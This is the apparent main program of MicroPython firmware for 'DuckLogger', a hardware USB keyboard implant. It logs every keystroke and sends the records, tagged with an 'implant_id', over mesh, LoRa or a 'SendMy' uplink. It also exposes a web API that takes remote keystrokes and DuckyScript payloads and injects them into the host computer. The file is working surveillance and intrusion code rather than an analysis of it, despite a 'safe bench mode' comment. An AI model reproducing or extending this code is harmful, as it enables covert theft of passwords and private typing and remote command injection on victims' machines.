from settings import Settings

settings = Settings()

if settings.role == "lora_sink":
    import asyncio
    import wifi_radio
    from sx1262 import from_settings
    from lora_link import LoRaLink
    from lora_sink import LoRaSink
    from lora_web import LoRaSinkAPI

    radio = from_settings(settings)
    link = LoRaLink(radio, settings.lora_key,
                    ack_timeout_ms=settings.lora_ack_timeout_ms,
                    max_retries=settings.lora_max_retries)
    sink = LoRaSink(settings.storage_directory,
                    max_bytes=settings.storage_max_bytes,
                    max_files=settings.storage_max_files,
                    ring_size=settings.storage_ring_size,
                    radio=link)
    wifi_radio.start(settings)
    api = LoRaSinkAPI(sink, settings.api_token)

    async def run_lora_sink():
        asyncio.create_task(api.start_server())
        while True:
            link.poll()
            message = link.receive()
            while message is not None:
                session, message_seq, document = message
                quality = {"rssi": radio.last_rssi, "snr": radio.last_snr}
                sink.ingest(session, message_seq, document, quality)
                message = link.receive()
            await asyncio.sleep_ms(10)

    asyncio.run(run_lora_sink())
elif settings.mesh_only:
    # Safe bench mode: the mesh node emits synthetic telemetry or decoded
    # DuckLogger key events only. Do not initialize USB HID.
    import asyncio
    from mesh_network import MeshNetwork
    from mesh_store import MeshStore
    from egress import EgressManager
    from sendmy import SendMyQueue

    if settings.role not in ("node", "gateway") or not settings.mesh_enabled:
        raise ValueError("mesh_only requires an enabled node or gateway role")

    mesh_store = None
    egress = None
    sendmy = None
    if settings.role == "gateway":
        mesh_store = MeshStore(settings.mesh_log_path)
        egress = EgressManager(settings)
    elif settings.uplink_sendmy:
        sendmy = SendMyQueue(settings)

    def on_data(packet, mac):
        record = None
        if mesh_store is not None:
            record = mesh_store.append(packet, mac)
        if egress is not None:
            egress.enqueue(record)

    mesh = MeshNetwork(settings, on_data=on_data)
    mesh.start()

    def publish_key_event(press):
        if settings.uplink_mesh:
            mesh.publish_key_event(press)
        if sendmy is not None:
            sequence = mesh.sequence if settings.uplink_mesh else sendmy.sent + len(sendmy.queue) + 1
            sendmy.enqueue({
                "network_id": settings.mesh_network_id,
                "implant_id": settings.node_id,
                "boot_id": mesh.boot_id,
                "sequence": sequence,
                "kind": "key_event",
                "value": press,
            })

    async def run_mesh_node():
        asyncio.create_task(mesh.run())
        if settings.role == "gateway":
            if egress is not None:
                asyncio.create_task(egress.run())
            if settings.management_enabled:
                import wifi_radio
                wifi_radio.start(settings, channel=settings.mesh_channel)
                from api import DuckLoggerAPI
                api = DuckLoggerAPI(
                    mesh=mesh,
                    mesh_log_path=settings.mesh_log_path,
                    hid_controls=False,
                    api_token=settings.api_token,
                    egress=egress,
                )
                asyncio.create_task(api.start_server())
        elif settings.data_source:
            from machine import Pin, UART
            from uart_buffer import UARTBuffer
            from key_led import KeyboardLED
            from logger import Log
            from keyframe import KeyFrame

            uart = UART(1, baudrate=115200, tx=Pin(2), rx=Pin(1))
            buffer = UARTBuffer(uart)
            led = KeyboardLED(uart)
            log = Log(20_000, led)
            keyframe = KeyFrame()

            async def run_data_source():
                while True:
                    frame = await buffer.get_frame()
                    led.update_led(frame)
                    modifiers = keyframe.get_modifiers(frame)
                    keys = keyframe.get_keys(frame)
                    press = log.add(modifiers, keys)
                    if press:
                        publish_key_event(press)

            async def flush_log():
                while True:
                    await asyncio.sleep_ms(10_000)
                    log._flush()

            asyncio.create_task(run_data_source())
            asyncio.create_task(flush_log())
        elif settings.synthetic_telemetry:
            asyncio.create_task(mesh.run_synthetic_telemetry())
        while True:
            if sendmy is not None:
                sendmy.flush_one()
            await asyncio.sleep_ms(1000)

    asyncio.run(run_mesh_node())
else:
    from machine import Pin, UART
    import neopixel
    import time
    import asyncio

    PIN_NUM = 48
    NUM_LEDS = 1
    np = neopixel.NeoPixel(Pin(PIN_NUM), NUM_LEDS)

    for _ in range(5):
        np[0] = (0, 255, 0)
        np.write()
        time.sleep(0.2)
        np[0] = (0, 0, 0)
        np.write()
        time.sleep(0.2)

    from uart_buffer import UARTBuffer
    from key_led import KeyboardLED
    from logger import Log
    from keyboard import Keyboard
    from api import DuckLoggerAPI
    from mapper import HIDEncoder
    from duckyscript import DuckyScript
    import wifi_radio
    from mesh_network import MeshNetwork
    from mesh_store import MeshStore
    from egress import EgressManager
    from sendmy import SendMyQueue

    uart = UART(1, baudrate=115200, tx=Pin(2), rx=Pin(1))
    buffer = UARTBuffer(uart)
    led = KeyboardLED(uart)
    log = Log(20_000, led)
    kbd = Keyboard()

    mesh = None
    mesh_store = None
    egress = None
    sendmy = SendMyQueue(settings) if settings.uplink_sendmy else None
    if settings.mesh_enabled and settings.role in ("node", "gateway"):
        mesh_store = MeshStore(settings.mesh_log_path)
        if settings.role == "gateway":
            egress = EgressManager(settings)

        def on_data(packet, mac):
            record = None
            if settings.role == "gateway":
                record = mesh_store.append(packet, mac)
            if egress is not None:
                egress.enqueue(record)

        mesh = MeshNetwork(settings, on_data=on_data)
        mesh.start()

    if settings.management_enabled and (
        settings.local_ui or settings.role in ("standalone", "gateway")
    ):
        wifi_radio.start(
            settings,
            channel=settings.mesh_channel if mesh is not None else None,
        )

    encoder = HIDEncoder()

    async def main():
        if mesh is not None:
            asyncio.create_task(mesh.run())
            if settings.role == "node" and settings.synthetic_telemetry:
                asyncio.create_task(mesh.run_synthetic_telemetry())
        if egress is not None:
            asyncio.create_task(egress.run())

        api = DuckLoggerAPI(
            mesh=mesh,
            mesh_log_path=settings.mesh_log_path,
            hid_controls=(settings.role != "gateway"),
            api_token=settings.api_token,
            egress=egress,
        )
        remote_keys = api.keys
        scripts = api.scripts
        script_execution = api.script_execution
        asyncio.create_task(api.start_server())
        last_activity = time.ticks_ms()

        while True:
            if time.ticks_diff(time.ticks_ms(), last_activity) >= 10_000:
                log._flush()
                last_activity = time.ticks_ms()

            if not scripts.is_empty():
                ducky_script = DuckyScript(scripts.dequeue(), kbd)
                try:
                    await ducky_script.inject()
                    script_execution.enqueue("Success")
                except ValueError as exc:
                    script_execution.enqueue(str(exc))

            if not remote_keys.is_empty():
                key = remote_keys.dequeue()
                key_codes = encoder.key_parser(key)
                kbd.send_keys(key_codes)
                await asyncio.sleep_ms(20)
                kbd.send_keys([])
                continue

            if not uart.any():
                await asyncio.sleep(0)
                continue

            frame = await buffer.get_frame()
            led.update_led(frame)
            kbd.emulate(frame)
            modifiers = kbd.get_modifiers(frame)
            keys = kbd.get_keys(frame)
            press = log.add(modifiers, keys)
            if mesh is not None and settings.role == "node" and press:
                if settings.uplink_mesh:
                    mesh.publish_key_event(press)
                if sendmy is not None:
                    sequence = (mesh.sequence if settings.uplink_mesh else
                                sendmy.sent + len(sendmy.queue) + 1)
                    sendmy.enqueue({
                        "network_id": settings.mesh_network_id,
                        "implant_id": settings.node_id,
                        "boot_id": mesh.boot_id,
                        "sequence": sequence,
                        "kind": "key_event",
                        "value": press,
                    })
                    sendmy.flush_one()
            last_activity = time.ticks_ms()

    asyncio.run(main())
